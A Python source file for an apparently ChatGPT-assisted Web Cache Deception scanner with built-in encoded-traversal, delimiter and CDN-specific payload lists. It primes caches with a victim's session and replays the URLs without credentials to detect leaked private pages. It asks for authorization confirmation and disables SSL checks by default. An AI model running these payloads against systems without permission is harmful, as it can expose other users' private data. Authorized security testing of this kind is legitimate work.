#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
web_cache_diff.py — Full-featured Web Cache Deception scanner (DIFF MODE)
========================================================================
This script automates testing for Web Cache Deception (WCD) vulnerabilities.

Primary flow:
 1. Parse an authenticated curl command (or curl file) to get a victim request.
 2. Execute the authenticated request (victim) to capture baseline response body & headers.
 3. Generate a set of candidate payload URLs (file suffixes, delimiters, encoded traversal, dot-segments, odd extensions).
 4. For each payload:
    a. Prime the cache by requesting the payload as victim (with cookies/headers).
    b. Wait a configurable time (prime-wait).
    c. Request the same payload as attacker (no cookies/authorization).
    d. Capture attacker response, compute similarity vs baseline and detect cache headers.
    e. Optionally re-check a small number of times to catch delayed cache behaviour.
 5. Score and flag high-confidence vulnerabilities.
 6. Produce rich JSON and DIFF-mode HTML reports (side-by-side snippets + unified diff).

New features in this final version:
 - vendor-mode: cloudflare | fastly | akamai  (adds targeted payloads + priorities)
 - DIFF HTML report with per-payload snippet previews and unified diff
 - --verify-ssl flag to enable strict HTTPS cert checking (default: off for labs)
 - verbose comments & docstrings to help you understand and modify behaviour

Usage examples:
  python3 web_cache_diff.py --curl-file auth_curl.txt --vendor-mode cloudflare --threshold 0.6 --out report.json --html report.html
  python3 web_cache_diff.py --curl "<curl ... >" --verify-ssl --html report.html

Author: Kullai × ChatGPT
"""

# ---------------------------
# Standard imports
# ---------------------------
import argparse
import difflib
import hashlib
import html
import json
import os
import re
import sys
import time
from copy import deepcopy
from dataclasses import dataclass, field
from typing import Dict, List, Optional, Tuple
from urllib.parse import urlparse

import requests
import urllib3

# ---------------------------
# Suppress noisy SSL warnings
# ---------------------------
# For lab testing and self-signed certs, we default to not verifying SSL.
# This invocation suppresses the InsecureRequestWarning to keep console output clean.
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ---------------------------
# Terminal color helpers
# ---------------------------
class C:
    RED = "\033[31m"
    GREEN = "\033[32m"
    YELLOW = "\033[33m"
    CYAN = "\033[36m"
    BOLD = "\033[1m"
    RESET = "\033[0m"


def color_ok(s): return f"{C.GREEN}{s}{C.RESET}"
def color_warn(s): return f"{C.YELLOW}{s}{C.RESET}"
def color_bad(s): return f"{C.RED}{s}{C.RESET}"
def color_info(s): return f"{C.CYAN}{s}{C.RESET}"
def color_head(s): return f"{C.BOLD}{s}{C.RESET}"


# ---------------------------
# Default payload lists (base)
# ---------------------------
# These are the canonical payloads used in many WCD reports / labs.
BASE_FILE_SUFFIXES = [
    "attacker.jpg", "attacker.png", "attacker.css", "attacker.js",
    "attacker.txt", "attacker.webp", "index.html", "attacker.svg", "evil.json"
]

BASE_DELIMS = [
    ";", ";test", ".test",
    "%2F..%2F", "%2F.%2F", "/..%2F",
    "%2E%2E%2F", "%5C..%5C", "..%2F", "%2F%2E%2E%2F"
]

BASE_DOTSEG = [
    "/../", "/%2E%2E/", "/a/../", "/a%2F..%2F"
]

BASE_ODD_EXTS = [
    "file.avif", "file.webp", "file.x", "file.unknownext", "file.woff2"
]

# ---------------------------
# Vendor heuristics (profiles)
# ---------------------------
# Each vendor profile adds a few targeted payload variants and influences
# which payloads we run first (in practice this increases hit rate).
VENDOR_PROFILES = {
    "cloudflare": {
        "extensions": ["js", "css", "json", "ico", "jpg", "png"],
        "patterns": ["?cf_cache=true", ";cdn-cache", "/.cf-assets/"],
        "note": "Cloudflare often aggressively caches static extensions and may ignore some query strings."
    },
    "fastly": {
        "extensions": ["woff2", "svg", "txt", "json"],
        "patterns": [";version=1", ";v=1", "?fastly=1"],
        "note": "Fastly historically can use semicolon parameters as cache key components."
    },
    "akamai": {
        "extensions": ["html", "asp", "php"],
        "patterns": ["/..;/", "%2F..%2F", "/;jsessionid="],
        "note": "Akamai edge rules sometimes normalize encoded slashes and dot-segments."
    }
}

# ---------------------------
# Data classes for structured data
# ---------------------------
@dataclass
class RequestSpec:
    """Represents the parsed authenticated request the user supplied (victim)."""
    method: str
    url: str
    headers: Dict[str, str] = field(default_factory=dict)
    data: Optional[str] = None
    cookies: Optional[str] = None


@dataclass
class ResponseRecord:
    """Compact record for storing a response and metadata we will compare."""
    url: str
    status: int
    headers: Dict[str, str]
    body: str
    body_len: int
    body_md5: str


@dataclass
class PayloadResult:
    """Result produced per tested payload."""
    payload_url: str
    prime_status: Optional[int] = None
    attacker_status: Optional[int] = None
    similarity: float = 0.0
    score: float = 0.0
    cache_evidence: List[str] = field(default_factory=list)
    attacker_headers: Dict[str, str] = field(default_factory=dict)
    victim_like: bool = False
    notes: List[str] = field(default_factory=list)
    attacker_body_len: int = 0
    attacker_body_md5: str = ""
    preview_victim_snippet: str = ""
    preview_attacker_snippet: str = ""
    unified_diff_html: str = ""  # pre-rendered diff for HTML report


# ---------------------------
# Utilities: curl parsing, hashing, similarity, headers
# ---------------------------
def normalize_curl(curl: str) -> str:
    """
    Normalize zsh $'...' quoting into normal quotes. This helps when users copy
    zsh-style curl lines that include $'...' constructs.
    """
    return re.sub(r"\$'([^']*)'", r"'\1'", curl.strip())


def parse_curl(curl: str) -> RequestSpec:
    """
    Parse a typical single-line curl command into a RequestSpec.
    This parser handles:
      - -X / --request
      - -H / --header "Key: value"
      - -d / --data
      - -b / --cookie
      - final URL (http/https)
    It's intentionally simple but robust for typical use cases.
    """
    s = normalize_curl(curl)
    if s.startswith("curl "):
        s = s[5:]
    tokens = re.findall(r'''(?:"[^"]*"|'[^']*'|\S)+''', s)
    tokens = [t.strip('"').strip("'") for t in tokens]

    method = "GET"
    headers: Dict[str, str] = {}
    data = None
    cookies = None
    url = None

    i = 0
    while i < len(tokens):
        t = tokens[i]
        if t in ("-X", "--request"):
            i += 1
            method = tokens[i].upper()
        elif t.startswith("-X") and t != "-X":
            method = t[2:].upper()
        elif t in ("-H", "--header"):
            i += 1
            h = tokens[i]
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
        elif t.startswith("-H") and t != "-H":
            # compact -H'Key: Value'
            h = t[2:]
            if ":" in h:
                k, v = h.split(":", 1)
                headers[k.strip()] = v.strip()
        elif t in ("-d", "--data", "--data-raw", "--data-binary"):
            i += 1
            data = tokens[i]
            if method == "GET":
                method = "POST"
        elif t in ("-b", "--cookie"):
            i += 1
            cookies = tokens[i]
        elif t.startswith("http://") or t.startswith("https://"):
            url = t
        i += 1

    # last-token fallback
    if not url:
        for t in reversed(tokens):
            if t.startswith("http://") or t.startswith("https://"):
                url = t
                break

    if not url:
        raise ValueError("Could not parse URL from provided curl.")

    # prefer Cookie header if present
    if "Cookie" in headers and not cookies:
        cookies = headers["Cookie"]

    return RequestSpec(method=method, url=url, headers=headers, data=data, cookies=cookies)


def md5_of_text(s: str) -> str:
    """Return MD5 hex digest of input string (used to fingerprint bodies)."""
    return hashlib.md5(s.encode("utf-8", errors="ignore")).hexdigest()


def body_similarity(a: str, b: str) -> float:
    """Simple sequence-based similarity score in [0..1]."""
    return difflib.SequenceMatcher(None, a, b).ratio()


def lower_headers(h: Dict[str, str]) -> Dict[str, str]:
    """Normalize header keys to lowercase for easier checks."""
    return {k.lower(): v for k, v in h.items()}


def detect_cache_headers(h: Dict[str, str]) -> List[str]:
    """
    Look for common headers that indicate a cached response or caching policy.
    We consider: Age, X-Cache, Cf-Cache-Status, Via, X-Edge-Cache, Cache-Control:max-age>0
    """
    evidence = []
    for k, v in h.items():
        kl = k.lower()
        if kl in ("age", "x-cache", "cf-cache-status", "via", "x-edge-cache", "x-cache-hits"):
            evidence.append(f"{kl}:{v}")
        if kl == "cache-control" and "max-age" in v and not re.search(r"max-age=0\b", v):
            evidence.append(f"{kl}:{v}")
    return evidence


def preview_snippet(text: str, length: int = 320) -> str:
    """Return a short, whitespace-normalized, HTML-escaped snippet for report preview."""
    t = re.sub(r"\s+", " ", text).strip()
    if len(t) > length:
        t = t[:length] + "…"
    return html.escape(t, quote=True)


def unified_diff_html(a: str, b: str, max_lines: int = 500) -> str:
    """
    Generate a small unified diff between two texts and return HTML-escaped preformatted content.
    We escape HTML so it’s safe to embed in a page.
    """
    a_lines = a.splitlines()
    b_lines = b.splitlines()
    diff_lines = list(difflib.unified_diff(a_lines, b_lines, lineterm=""))
    if len(diff_lines) > max_lines:
        diff_lines = diff_lines[:max_lines] + ["... (truncated)"]
    return html.escape("\n".join(diff_lines))


# ---------------------------
# HTTP helper (requests wrapper)
# ---------------------------
def do_request(session: requests.Session, method: str, url: str, headers: Dict[str, str] = None,
               data=None, timeout: int = 20, verify_ssl: bool = False) -> Tuple[Optional[requests.Response], Dict[str, str]]:
    """
    Perform a request with error handling. Returns (response, normalized_headers).
    If request fails, returns (None, {}).
    """
    try:
        r = session.request(method=method, url=url, headers=headers, data=data,
                            allow_redirects=True, timeout=timeout, verify=verify_ssl)
        return r, lower_headers(r.headers)
    except Exception as e:
        print(color_warn(f"[!] Request error for {url}: {e}"))
        return None, {}


# ---------------------------
# Payload generation (with vendor-mode)
# ---------------------------
def generate_candidate_payloads(base_url: str, vendor: Optional[str] = None) -> List[str]:
    """
    Produce a list of candidate payload URLs to test, based on the target base URL.
    If vendor is provided and recognized, insert vendor-specific prioritized payloads.
    """
    base = base_url.rstrip("/")
    candidates: List[str] = []

    # 1) Classic file suffixes appended
    for s in BASE_FILE_SUFFIXES:
        candidates.append(f"{base}/{s}")

    # 2) Delimiter fuzz (common WCD trick variants)
    for d in BASE_DELIMS:
        candidates.append(f"{base}{d}")
        candidates.append(f"{base}{d}/")

    # 3) Dot-segment permutations
    for ds in BASE_DOTSEG:
        candidates.append(f"{base}{ds}")

    # 4) Odd extensions to target CDN heuristics
    for e in BASE_ODD_EXTS:
        candidates.append(f"{base}/{e}")

    # 5) Vendor-specific augmentation
    if vendor and vendor in VENDOR_PROFILES:
        profile = VENDOR_PROFILES[vendor]
        # Add extension-focused payloads first (higher priority)
        for ext in profile.get("extensions", []):
            candidates.insert(0, f"{base}/attacker.{ext}")
        # Add pattern-based payloads
        for pat in profile.get("patterns", []):
            candidates.append(f"{base}{pat}")

    # Deduplicate while preserving order
    seen = set()
    final = []
    for u in candidates:
        if u not in seen:
            final.append(u)
            seen.add(u)
    return final


# ---------------------------
# Core scanner class
# ---------------------------
class WCDScanner:
    """
    Encapsulates the scanner state and logic:
      - Holds sessions for victim (with auth headers/cookies) and attacker (stripped headers)
      - Captures baseline
      - Tests each payload (prime + attack) with rechecks
      - Produces PayloadResult objects
    """

    def __init__(self, req: RequestSpec, verify_ssl: bool = False,
                 prime_wait: float = 5.0, rechecks: int = 1, recheck_wait: float = 5.0,
                 threshold: float = 0.7):
        self.req = req
        self.verify_ssl = verify_ssl
        self.prime_wait = prime_wait
        self.rechecks = rechecks
        self.recheck_wait = recheck_wait
        self.threshold = threshold

        # sessions
        self.victim_session = requests.Session()
        self.attacker_session = requests.Session()

        # victim session should include cookies/headers from the parsed curl
        if self.req.cookies:
            self.victim_session.headers.update({"Cookie": self.req.cookies})
        if self.req.headers:
            # merge headers into victim session
            self.victim_session.headers.update(self.req.headers)

        # attacker headers: copy victim headers but remove auth-related fields
        attacker_h = deepcopy(self.req.headers)
        for k in list(attacker_h.keys()):
            if k.lower() in ("cookie", "authorization", "x-auth-token"):
                attacker_h.pop(k)
        self.attacker_headers = attacker_h

    def capture_baseline(self) -> ResponseRecord:
        """Execute the authenticated (victim) request and return baseline ResponseRecord."""
        print(color_info("[*] Capturing baseline (authenticated) response..."))
        r, h = do_request(self.victim_session, self.req.method, self.req.url,
                          headers=self.req.headers, data=self.req.data, verify_ssl=self.verify_ssl)
        if not r:
            raise SystemExit(color_bad("[-] Failed to fetch baseline. Aborting."))
        body = r.text
        rec = ResponseRecord(url=self.req.url, status=r.status_code, headers=h,
                             body=body, body_len=len(body), body_md5=md5_of_text(body))
        print(color_ok(f"[+] Baseline captured: status={rec.status} len={rec.body_len} md5={rec.body_md5}"))
        return rec

    def test_payload_once(self, payload_url: str, baseline: ResponseRecord) -> PayloadResult:
        """
        Perform a single priming (victim) + attacker replay, compute similarity & evidence,
        and return a PayloadResult. This function does not perform rechecks.
        """
        pr_notes = []
        # Prime the cache as the victim (with auth)
        print(color_info(f"    [>] Priming as victim: {payload_url}"))
        rp, _ = do_request(self.victim_session, "GET", payload_url, headers=self.req.headers, verify_ssl=self.verify_ssl)
        prime_status = rp.status_code if rp else None
        pr_notes.append(f"prime_status={prime_status}")

        # Wait a small time to allow caches to process the primed object
        if self.prime_wait > 0:
            time.sleep(self.prime_wait)

        # Attacker request (no auth)
        print(color_info(f"    [>] Attacker request (no auth): {payload_url}"))
        ra, ha = do_request(self.attacker_session, "GET", payload_url, headers=self.attacker_headers, verify_ssl=self.verify_ssl)
        if not ra:
            return PayloadResult(payload_url=payload_url, prime_status=prime_status, attacker_status=None, notes=pr_notes)

        attacker_body = ra.text
        similarity = body_similarity(baseline.body, attacker_body)
        cache_evd = detect_cache_headers(ha)

        # scoring: combine similarity (0.6) + cache evidence (0.3) + status parity (0.1)
        score = 0.6 * similarity
        if cache_evd:
            score += 0.3
        if ra.status_code == baseline.status:
            score += 0.1
        score = min(score, 1.0)

        victim_like = (similarity >= 0.6 and ra.status_code == baseline.status)

        # snippet previews and unified diff for HTML report
        v_prev = preview_snippet(baseline.body, length=500)
        a_prev = preview_snippet(attacker_body, length=500)
        u_diff = unified_diff_html(baseline.body, attacker_body, max_lines=800)

        return PayloadResult(
            payload_url=payload_url,
            prime_status=prime_status,
            attacker_status=ra.status_code,
            similarity=round(similarity, 3),
            score=round(score, 3),
            cache_evidence=cache_evd,
            attacker_headers=ha,
            victim_like=victim_like,
            notes=pr_notes,
            attacker_body_len=len(attacker_body),
            attacker_body_md5=md5_of_text(attacker_body),
            preview_victim_snippet=v_prev,
            preview_attacker_snippet=a_prev,
            unified_diff_html=u_diff
        )

    def test_payload_with_rechecks(self, payload_url: str, baseline: ResponseRecord) -> PayloadResult:
        """
        Run initial priming + attacker check and optionally recheck (useful when caches
        require multiple requests/time to be populated). Returns the final PayloadResult.
        """
        result = self.test_payload_once(payload_url, baseline)
        tries = self.rechecks
        while tries > 0 and (result.score < self.threshold or not result.cache_evidence):
            # Re-check: prime again and re-run attacker request
            print(color_warn(f"    [~] Inconclusive (score={result.score} cache={result.cache_evidence}); recheck in {self.recheck_wait}s..."))
            time.sleep(self.recheck_wait)
            result = self.test_payload_once(payload_url, baseline)
            tries -= 1
        return result


# ---------------------------
# HTML report generator (DIFF MODE)
# ---------------------------
def write_html_report(path: str, baseline: ResponseRecord, results: List[PayloadResult], threshold: float):
    """
    Create a detailed HTML report that includes:
      - baseline metadata
      - table of tested payloads with summary scores and cache evidence
      - for each flagged result, an expandable diff (victim vs attacker) plus snippets
    The report is intentionally styled dark and uses preformatted blocks for diffs.
    """
    # Simple CSS for the report
    css = """
    body { background:#0b1220; color:#e6eef6; font-family: Inter, ui-sans-serif, system-ui, -apple-system, "Segoe UI", Roboto, "Helvetica Neue", Arial; padding:20px; }
    h1 { color:#93c5fd; }
    table { width:100%; border-collapse:collapse; margin-top:12px; }
    th, td { padding:8px 10px; border-bottom:1px solid #1f2937; text-align:left; vertical-align:top; }
    th { color:#9ca3af; font-weight:600; }
    code { color:#fbbf24; font-family: monospace; font-size:0.95em; }
    .card { background:#071025; border:1px solid #112137; padding:12px; border-radius:8px; margin-bottom:12px; }
    .vuln { border-left:4px solid #dc2626; padding-left:8px; margin-bottom:10px; }
    .ok { border-left:4px solid #16a34a; padding-left:8px; margin-bottom:10px; }
    pre { background:#071124; padding:10px; border-radius:6px; color:#e6eef6; overflow:auto; }
    details summary { cursor:pointer; color:#60a5fa; margin-bottom:6px; }
    """

    # Build the table rows
    rows_html = []
    flagged_html = []  # detailed diffs for flagged vulns
    for r in results:
        ev = ", ".join(r.cache_evidence) if r.cache_evidence else "—"
        vuln = r.score >= threshold and r.victim_like
        status_class = "vuln" if vuln else "ok"
        rows_html.append(f"""
        <tr class="{status_class}">
          <td><code>{html.escape(r.payload_url)}</code></td>
          <td style="text-align:center">{r.prime_status or '-'}</td>
          <td style="text-align:center">{r.attacker_status or '-'}</td>
          <td style="text-align:right">{r.similarity:.3f}</td>
          <td style="text-align:right">{r.score:.3f}</td>
          <td>{html.escape(ev)}</td>
        </tr>
        """)
        if vuln:
            # create detailed diff card
            flagged_html.append(f"""
            <div class="card vuln">
              <div style="display:flex;justify-content:space-between;align-items:center;">
                <div><strong>VULNERABLE:</strong> <code>{html.escape(r.payload_url)}</code></div>
                <div style="color:#9ca3af">score={r.score:.3f} sim={r.similarity:.3f}</div>
              </div>
              <div style="margin-top:8px;color:#9ca3af">Cache evidence: {html.escape(', '.join(r.cache_evidence) or 'none')}</div>
              <details style="margin-top:8px">
                <summary>View snippets & diff</summary>
                <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:8px">
                  <div>
                    <div style="font-weight:600;margin-bottom:4px">Victim snippet</div>
                    <pre>{r.preview_victim_snippet}</pre>
                  </div>
                  <div>
                    <div style="font-weight:600;margin-bottom:4px">Attacker snippet</div>
                    <pre>{r.preview_attacker_snippet}</pre>
                  </div>
                </div>
                <div style="margin-top:8px">
                  <div style="font-weight:600;margin-bottom:4px">Unified diff (victim → attacker)</div>
                  <pre>{r.unified_diff_html}</pre>
                </div>
              </details>
            </div>
            """)

    # Put together the final HTML
    html_doc = f"""<!doctype html>
<html lang="en">
<head><meta charset="utf-8"><title>WCD DIFF Report</title><meta name="viewport" content="width=device-width,initial-scale=1">
<style>{css}</style></head>
<body>
  <h1>Web Cache Deception — DIFF Report</h1>
  <div class="card">
    <div><b>Baseline URL:</b> <code>{html.escape(baseline.url)}</code></div>
    <div style="margin-top:6px"><b>Baseline status:</b> {baseline.status} &nbsp; <b>body MD5:</b> {baseline.body_md5} &nbsp; <b>len:</b> {baseline.body_len}</div>
  </div>

  <h2>Flagged Vulnerabilities</h2>
  {"".join(flagged_html) if flagged_html else "<div class='card'>No high-confidence vulnerabilities found at the configured threshold.</div>"}

  <h2>All tested payloads</h2>
  <table>
    <thead><tr><th>Payload URL</th><th>Prime</th><th>Attacker</th><th>Sim</th><th>Score</th><th>Cache Evidence</th></tr></thead>
    <tbody>
      {''.join(rows_html)}
    </tbody>
  </table>

  <p style="color:#9ca3af;margin-top:18px">Scoring formula: <code>0.6×similarity + 0.3×(cache evidence present) + 0.1×status parity</code>. Threshold={threshold:.2f}</p>
</body>
</html>
"""
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(html_doc)


# ---------------------------
# Main CLI and orchestrator
# ---------------------------
def main():
    parser = argparse.ArgumentParser(description="WCD DIFF scanner (full-featured).")
    src = parser.add_mutually_exclusive_group(required=True)
    src.add_argument("--curl", help="The authenticated curl command (single-line).")
    src.add_argument("--curl-file", help="Path to a file containing the authenticated curl command.")
    parser.add_argument("--vendor-mode", choices=list(VENDOR_PROFILES.keys()), help="Enable vendor-specific heuristics.")
    parser.add_argument("--prime-wait", type=float, default=5.0, help="Seconds to wait after priming (default: 5).")
    parser.add_argument("--rechecks", type=int, default=1, help="Number of rechecks if inconclusive (default: 1).")
    parser.add_argument("--recheck-wait", type=float, default=5.0, help="Seconds to wait between rechecks (default: 5).")
    parser.add_argument("--threshold", type=float, default=0.7, help="Score threshold for vulnerability (0..1).")
    parser.add_argument("--verify-ssl", action="store_true", help="Enable strict SSL certificate verification.")
    parser.add_argument("--out", help="Write JSON report to this path.")
    parser.add_argument("--html", help="Write DIFF HTML report to this path.")
    args = parser.parse_args()

    print(color_head("== Web Cache Deception (DIFF) Scanner =="))
    print(color_warn("[!] ONLY run this tool against systems you are authorized to test.\n"))

    # Read curl input
    curl_text = args.curl if args.curl else open(args.curl_file, "r", encoding="utf-8").read().strip()

    # Parse curl into RequestSpec
    print(color_info("[*] Parsing curl command..."))
    try:
        req = parse_curl(curl_text)
    except Exception as e:
        print(color_bad(f"[!] Failed to parse curl: {e}"))
        sys.exit(1)
    print(color_ok(f"[+] Parsed: method={req.method} url={req.url}"))

    # Confirm user has permission
    if input(color_info("Type YES to confirm you are authorized to test this target: ")).strip() != "YES":
        print(color_bad("Aborted by user."))
        sys.exit(1)

    # Create scanner instance
    scanner = WCDScanner(req, verify_ssl=args.verify_ssl,
                         prime_wait=args.prime_wait,
                         rechecks=args.rechecks,
                         recheck_wait=args.recheck_wait,
                         threshold=args.threshold)

    # Capture baseline (authenticated response)
    baseline = scanner.capture_baseline()

    # Generate payloads (with optional vendor heuristics)
    payloads = generate_candidate_payloads(baseline.url, vendor=args.vendor_mode)
    print(color_info(f"[*] Generated {len(payloads)} payload candidates (vendor_mode={args.vendor_mode})."))

    # Run tests
    results: List[PayloadResult] = []
    flagged: List[PayloadResult] = []
    for p in payloads:
        print(color_head(f"[•] Testing payload: {p}"))
        res = scanner.test_payload_with_rechecks(p, baseline)
        results.append(res)
        # show concise console line
        ev = ", ".join(res.cache_evidence) if res.cache_evidence else "—"
        status_str = f"prime={res.prime_status} attacker={res.attacker_status}"
        if res.score >= args.threshold and res.victim_like:
            print(color_bad(f"    [VULNERABLE] sim={res.similarity:.3f} score={res.score:.3f} cache=[{ev}] ({status_str})"))
            flagged.append(res)
        else:
            print(color_warn(f"    [OK/NOISE]  sim={res.similarity:.3f} score={res.score:.3f} cache=[{ev}] ({status_str})"))

    # Summary
    print(color_head("\n=== SUMMARY ==="))
    if flagged:
        print(color_bad(f"[!] Found {len(flagged)} high-confidence vulnerable payload(s):"))
        for v in flagged:
            print(color_bad(f"  -> {v.payload_url}  score={v.score:.3f} sim={v.similarity:.3f} cache={'; '.join(v.cache_evidence) or '—'}"))
    else:
        print(color_ok("[+] No high-confidence vulnerable payloads detected at this threshold."))

    # JSON output (full results)
    if args.out:
        # we produce compact JSON with essential fields; bodies not included by default to keep file sizes reasonable.
        json_out = {
            "meta": {
                "target": baseline.url,
                "threshold": args.threshold,
                "vendor_mode": args.vendor_mode,
                "generated_at": int(time.time())
            },
            "baseline": {
                "url": baseline.url, "status": baseline.status, "body_len": baseline.body_len, "body_md5": baseline.body_md5,
                "headers": baseline.headers
            },
            "results": []
        }
        for r in results:
            json_out["results"].append({
                "payload_url": r.payload_url,
                "prime_status": r.prime_status,
                "attacker_status": r.attacker_status,
                "similarity": r.similarity,
                "score": r.score,
                "cache_evidence": r.cache_evidence,
                "attacker_headers": r.attacker_headers,
                "attacker_body_len": r.attacker_body_len,
                "attacker_body_md5": r.attacker_body_md5,
                "victim_like": r.victim_like,
                "notes": r.notes
            })
        with open(args.out, "w", encoding="utf-8") as fh:
            json.dump(json_out, fh, indent=2)
        print(color_info(f"[*] JSON report written to {args.out}"))

    # HTML DIFF report - convenient visual output with snippets + diffs
    if args.html:
        write_html_report(args.html, baseline, results, args.threshold)
        print(color_info(f"[*] HTML DIFF report written to {args.html}"))

    print(color_head("\nDone."))


if __name__ == "__main__":
    main()